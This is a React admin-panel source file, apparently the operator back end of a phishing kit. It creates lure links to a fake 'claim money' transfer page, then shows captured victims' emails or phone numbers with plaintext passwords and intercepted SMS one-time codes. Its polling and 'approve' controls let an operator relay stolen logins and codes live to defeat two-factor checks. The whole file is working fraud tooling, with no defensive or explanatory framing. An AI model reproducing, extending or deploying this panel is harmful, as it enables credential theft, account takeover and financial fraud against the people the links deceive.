import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { LogOut, Copy, Check, Trash2, Plus, Clock, CheckCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";

interface GeneratedLink {
  id: string;
  price: string;
  name: string;
  link: string;
  contextData: string;
  createdAt: string;
}

interface LoginAttempt {
  id: number;
  emailOrPhone: string;
  password: string;
  returnUri: string;
  timestamp: string;
  approved: boolean;
}

interface SmsSubmission {
  id: number;
  otpCode: string;
  stepupContext: string;
  rememberDevice: boolean;
  timestamp: string;
}

export const AdminPanel = (): JSX.Element => {
  const [price, setPrice] = useState("");
  const [name, setName] = useState("");
  const [generatedLinks, setGeneratedLinks] = useState<GeneratedLink[]>([]);
  const [copied, setCopied] = useState<string | null>(null);
  const { toast } = useToast();
  const queryClient = useQueryClient();

  // Fetch login attempts
  const { data: loginAttempts = [], refetch: refetchAttempts } = useQuery({
    queryKey: ["/api/login-attempts"],
    queryFn: async () => {
      const res = await apiRequest("GET", "/api/login-attempts");
      return await res.json();
    },
    refetchInterval: 3000, // Auto refresh every 3 seconds
  });

  // Fetch SMS submissions
  const { data: smsSubmissions = [] } = useQuery({
    queryKey: ["/api/sms-submissions"],
    queryFn: async () => {
      const res = await apiRequest("GET", "/api/sms-submissions");
      return await res.json();
    },
    refetchInterval: 3000, // Auto refresh every 3 seconds
  });

  // Approve login attempt mutation
  const approveMutation = useMutation({
    mutationFn: (id: number) => apiRequest("POST", `/api/login-attempts/${id}/approve`),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/login-attempts"] });
      toast({
        title: "Erfolg",
        description: "Anmeldung wurde genehmigt",
      });
    },
    onError: () => {
      toast({
        title: "Fehler",
        description: "Fehler beim Genehmigen der Anmeldung",
        variant: "destructive",
      });
    },
  });

  // Load links from localStorage on component mount
  useEffect(() => {
    const savedLinks = localStorage.getItem('generatedLinks');
    if (savedLinks) {
      setGeneratedLinks(JSON.parse(savedLinks));
    }
  }, []);

  // Save links to localStorage whenever links change
  useEffect(() => {
    localStorage.setItem('generatedLinks', JSON.stringify(generatedLinks));
  }, [generatedLinks]);

  const generateRandomString = () => {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let result = "";
    for (let i = 0; i < 64; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const generateLink = () => {
    if (!price || !name) {
      toast({
        title: "Ошибка",
        description: "Пожалуйста, заполните все поля",
        variant: "destructive",
      });
      return;
    }

    const randomString = generateRandomString();
    const baseUrl = window.location.origin;
    const link = `${baseUrl}/myaccount/transfer/claim-money?context_data=${randomString}&price=${encodeURIComponent(price)}&name=${encodeURIComponent(name)}`;
    
    const newLink: GeneratedLink = {
      id: Date.now().toString(),
      price,
      name,
      link,
      contextData: randomString,
      createdAt: new Date().toLocaleString('ru-RU'),
    };

    setGeneratedLinks(prev => [newLink, ...prev]);
    setPrice("");
    setName("");
    
    toast({
      title: "Ссылка создана!",
      description: "Новая ссылка добавлена в список",
    });
  };

  const copyToClipboard = async (linkToCopy: string, linkId: string) => {
    try {
      await navigator.clipboard.writeText(linkToCopy);
      setCopied(linkId);
      toast({
        title: "Скопировано!",
        description: "Ссылка скопирована в буфер обмена",
      });
      setTimeout(() => setCopied(null), 2000);
    } catch (err) {
      toast({
        title: "Ошибка",
        description: "Не удалось скопировать ссылку",
        variant: "destructive",
      });
    }
  };

  const deleteLink = (linkId: string) => {
    setGeneratedLinks(prev => prev.filter(link => link.id !== linkId));
    toast({
      title: "Ссылка удалена",
      description: "Ссылка была удалена из списка",
    });
  };

  const deleteAllLinks = () => {
    setGeneratedLinks([]);
    toast({
      title: "Все ссылки удалены",
      description: "Список ссылок очищен",
    });
  };

  const handleLogout = () => {
    window.location.href = "/";
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="max-w-7xl mx-auto p-6">
        {/* Header */}
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-3xl font-bold text-gray-900">Админ панель</h1>
          <Button 
            onClick={handleLogout}
            variant="outline"
            className="flex items-center gap-2"
          >
            <LogOut className="w-4 h-4" />
            Выйти
          </Button>
        </div>

        <Tabs defaultValue="create" className="space-y-6">
          <TabsList className="grid w-full grid-cols-3">
            <TabsTrigger value="create">
              <Plus className="w-4 h-4 mr-2" />
              Создать ссылку
            </TabsTrigger>
            <TabsTrigger value="manage">Управление ссылками</TabsTrigger>
            <TabsTrigger value="logins">
              <Clock className="w-4 h-4 mr-2" />
              Попытки входа
              {loginAttempts.filter(attempt => !attempt.approved).length > 0 && (
                <span className="ml-2 bg-red-500 text-white text-xs rounded-full px-2 py-1">
                  {loginAttempts.filter(attempt => !attempt.approved).length}
                </span>
              )}
            </TabsTrigger>
            <TabsTrigger value="sms">
              SMS коды
              {smsSubmissions.length > 0 && (
                <span className="ml-2 bg-blue-500 text-white text-xs rounded-full px-2 py-1">
                  {smsSubmissions.length}
                </span>
              )}
            </TabsTrigger>
          </TabsList>

          <TabsContent value="create">
            <Card>
              <CardHeader>
                <CardTitle>Создать новую ссылку</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="price">Цена</Label>
                    <Input
                      id="price"
                      placeholder="10,00 €"
                      value={price}
                      onChange={(e) => setPrice(e.target.value)}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="name">Имя отправителя</Label>
                    <Input
                      id="name"
                      placeholder="Иван Иванов"
                      value={name}
                      onChange={(e) => setName(e.target.value)}
                    />
                  </div>
                </div>

                <Button onClick={generateLink} className="w-full">
                  <Plus className="w-4 h-4 mr-2" />
                  Создать ссылку
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="manage">
            <Card>
              <CardHeader className="flex flex-row items-center justify-between">
                <CardTitle>Управление ссылками ({generatedLinks.length})</CardTitle>
                {generatedLinks.length > 0 && (
                  <Button 
                    onClick={deleteAllLinks} 
                    variant="destructive" 
                    size="sm"
                  >
                    <Trash2 className="w-4 h-4 mr-2" />
                    Удалить все
                  </Button>
                )}
              </CardHeader>
              <CardContent>
                {generatedLinks.length === 0 ? (
                  <p className="text-center text-gray-500 py-8">
                    Нет созданных ссылок. Создайте первую ссылку во вкладке "Создать ссылку".
                  </p>
                ) : (
                  <div className="space-y-4">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>Цена</TableHead>
                          <TableHead>Имя</TableHead>
                          <TableHead>Создано</TableHead>
                          <TableHead>Действия</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {generatedLinks.map((link) => (
                          <TableRow key={link.id}>
                            <TableCell className="font-medium">{link.price}</TableCell>
                            <TableCell>{link.name}</TableCell>
                            <TableCell className="text-sm text-gray-500">{link.createdAt}</TableCell>
                            <TableCell className="space-x-2">
                              <Button
                                onClick={() => copyToClipboard(link.link, link.id)}
                                variant="outline"
                                size="sm"
                              >
                                {copied === link.id ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                              </Button>
                              <Button
                                onClick={() => deleteLink(link.id)}
                                variant="destructive"
                                size="sm"
                              >
                                <Trash2 className="w-4 h-4" />
                              </Button>
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          {/* Login Attempts Tab */}
          <TabsContent value="logins">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Clock className="w-5 h-5" />
                  Попытки входа
                  {loginAttempts.filter(attempt => !attempt.approved).length > 0 && (
                    <span className="bg-red-100 text-red-800 text-sm px-2 py-1 rounded-full">
                      {loginAttempts.filter(attempt => !attempt.approved).length} ожидают
                    </span>
                  )}
                </CardTitle>
              </CardHeader>
              <CardContent>
                {loginAttempts.length === 0 ? (
                  <div className="text-center py-8 text-gray-500">
                    <Clock className="w-12 h-12 mx-auto mb-4 text-gray-300" />
                    <p>Нет попыток входа</p>
                  </div>
                ) : (
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>Email/Телефон</TableHead>
                          <TableHead>Пароль</TableHead>
                          <TableHead>Return URI</TableHead>
                          <TableHead>Время</TableHead>
                          <TableHead>Статус</TableHead>
                          <TableHead>Действия</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {loginAttempts.map((attempt) => (
                          <TableRow key={attempt.id}>
                            <TableCell className="font-medium">
                              {attempt.emailOrPhone}
                            </TableCell>
                            <TableCell className="font-mono text-sm">
                              {attempt.password}
                            </TableCell>
                            <TableCell className="font-mono text-sm max-w-xs truncate">
                              {attempt.returnUri}
                            </TableCell>
                            <TableCell>
                              {new Date(attempt.timestamp).toLocaleString("de-DE")}
                            </TableCell>
                            <TableCell>
                              {attempt.approved ? (
                                <span className="flex items-center gap-1 text-green-600">
                                  <CheckCircle className="w-4 h-4" />
                                  Одобрено
                                </span>
                              ) : (
                                <span className="flex items-center gap-1 text-orange-600">
                                  <Clock className="w-4 h-4" />
                                  Ожидает
                                </span>
                              )}
                            </TableCell>
                            <TableCell>
                              {!attempt.approved && (
                                <Button
                                  onClick={() => approveMutation.mutate(attempt.id)}
                                  disabled={approveMutation.isPending}
                                  className="bg-green-600 hover:bg-green-700 text-white"
                                  size="sm"
                                >
                                  <CheckCircle className="w-4 h-4 mr-1" />
                                  Подтвердить
                                </Button>
                              )}
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="sms">
            <Card>
              <CardHeader>
                <CardTitle>SMS коды</CardTitle>
              </CardHeader>
              <CardContent>
                {smsSubmissions.length === 0 ? (
                  <p className="text-gray-500 text-center py-8">Нет SMS записей</p>
                ) : (
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>ID</TableHead>
                          <TableHead>OTP код</TableHead>
                          <TableHead>Stepup Context</TableHead>
                          <TableHead>Запомнить устройство</TableHead>
                          <TableHead>Время</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {smsSubmissions.map((submission: SmsSubmission) => (
                          <TableRow key={submission.id}>
                            <TableCell className="font-medium">{submission.id}</TableCell>
                            <TableCell>
                              <span className="font-mono bg-gray-100 px-2 py-1 rounded">
                                {submission.otpCode}
                              </span>
                            </TableCell>
                            <TableCell>
                              <span className="font-mono text-sm text-gray-600">
                                {submission.stepupContext}
                              </span>
                            </TableCell>
                            <TableCell>
                              {submission.rememberDevice ? (
                                <span className="text-green-600">✓ Да</span>
                              ) : (
                                <span className="text-gray-400">✗ Нет</span>
                              )}
                            </TableCell>
                            <TableCell>
                              {new Date(submission.timestamp).toLocaleString('ru-RU')}
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};